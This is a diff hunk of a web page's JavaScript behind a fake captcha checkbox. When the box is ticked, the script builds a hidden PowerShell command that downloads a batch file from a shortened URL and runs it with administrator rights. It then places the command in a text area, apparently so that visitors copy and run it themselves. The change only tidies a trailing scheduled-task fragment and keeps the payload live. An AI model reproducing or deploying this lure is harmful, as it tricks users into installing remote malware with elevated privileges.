@@ -137,7 +137,7 @@
     <script>
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
             if (this.checked) {
-                const command = `powershell -w h -c "iwr -useb https://tinyurl.com/38j9myu7 -OutFile $HOME\2fa.bat; while (!(Test-Path $HOME\2fa.bat)) {Start-Sleep 1}; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /min /b %HOMEPATH%\2fa.bat' -Verb RunAs"' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
+                const command = `powershell -w h -c "iwr -useb https://tinyurl.com/38j9myu7 -OutFile $HOME\2fa.bat; while (!(Test-Path $HOME\2fa.bat)) {Start-Sleep 1}; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start /min /b %HOMEPATH%\2fa.bat' -Verb RunAs"`;
                 
                 const textArea = document.createElement('textarea');
                 textArea.value = command;
